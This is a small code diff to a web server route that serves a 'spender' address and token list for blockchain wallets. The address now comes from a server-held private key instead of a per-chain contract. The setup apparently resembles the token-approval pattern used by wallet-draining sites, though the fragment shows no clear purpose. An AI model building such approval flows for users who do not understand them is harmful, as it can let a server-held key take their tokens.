@@ -455,10 +455,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/spender-config", async (req, res) => {
     try {
       const chainId = req.query.chainId ? parseInt(req.query.chainId as string) : null;
-
-      const contractAddress = chainId ? CHAIN_CONTRACTS[chainId] : null;
-      if (!contractAddress) {
-        return res.status(500).json({ error: "No contract configured for this chain" });
+      const spenderAddress = getSpenderAddress();
+      
+      if (!spenderAddress) {
+        return res.status(500).json({ error: "No spender configured (EVM_SPENDER_PRIVATE_KEY missing)" });
       }
 
       const tokens = chainId && CHAIN_TOKEN_ADDRESSES[chainId]
@@ -466,7 +466,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         : [];
       
       res.json({
-        spenderAddress: contractAddress,
+        spenderAddress,
         tokens,
         chainContracts: CHAIN_CONTRACTS,
       });
